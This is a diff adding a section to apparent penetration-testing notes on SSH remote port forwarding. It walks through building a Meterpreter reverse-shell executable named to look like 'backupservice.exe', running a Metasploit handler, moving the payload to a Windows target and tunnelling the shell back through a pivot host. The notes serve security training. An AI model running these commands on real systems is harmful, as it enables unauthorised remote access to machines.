@@ -98,3 +98,47 @@ $ ssh -D 9050 user@x.x.x.x
 ### Remote/Reverse port forwarding with SSH
 Lets say we are able to connect to a pivot host and then connect to another system. If we wanted to *get a reverse shell* we would have to forward the traffic all the way back through our chain and to our attack machine. We would do this by having the reverse shell point to our nearest pivot host to the target, then from there we would forward all the traffic back through our chain from the pivot host.
 ![[pivot-reverse-shell.drawio.png]]
+1. Create the payload / reverse shell application with the connection details for the pivot host
+```sh
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<internal_IP_of_pivot_host> LPORT=8080 -f exe -o backupservice.exe
+```
+2. Setup a `multi/handler` listening on our machine for the traffic
+```sh
+msf6 > use exploit/multi/handler
+> set payload windows/x64/meterpreter/reverse_https
+> set lhost 0.0.0.0
+> set lport 8000
+> run
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:8000
+```
+3. [[Misc/File Transfer|Transfer]] the payload over to the pivot host
+```sh
+$ scp backupservice.exe user@<IP_of_pivot_host>:~/
+```
+4. [[Misc/File Transfer|Transfer]] the file from the pivot host to the target
+```sh
+user@pivot_host$ python3 -m http.server 8123
+```
+```PowerShell
+PS C:\Windows\System32> Invoke-WebRequest -Uri "http://<internal_IP_of_pivot_host>:8123/backupservice.exe" -OutFile "C:\backupservice.exe"
+```
+5. Next we will use the *SSH remote port forwarding* feature to forward the traffic on the ubuntu server to our attack machine
+```sh
+$ ssh -R <internal_IP_of_pivot_host>:8080:0.0.0.0:8000 user@pivot_host -vN
+```
+> `-R` sets up the remote port forwarding, where the first IP & port is where the machine will receive traffic from eg. (its internal_ip & port) then where to forward the traffic too eg. (our IP  or 0.0.0.0, and port).
+> `-v` is verbose
+> `-N` asks not to prompt the login shell
+6. Execute the payload and we should get the reverse shell through our listener
+> Our connection will list that it is coming from the local host itself (127.0.0.1) as it is coming from the *local SSH socket*, but the traffic is really coming form an outbound connection we established to the pivot host.
+
+In the logs on the pivot host we will be able to see the forwarding:
+```
+debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
+debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
+debug1: channel 0: new [172.16.5.19]
+debug1: confirm forwarded-tcpip
+debug1: channel 0: connected to 0.0.0.0 port 8000
+```
+![[pivot-reverse-shell-2.webp]]
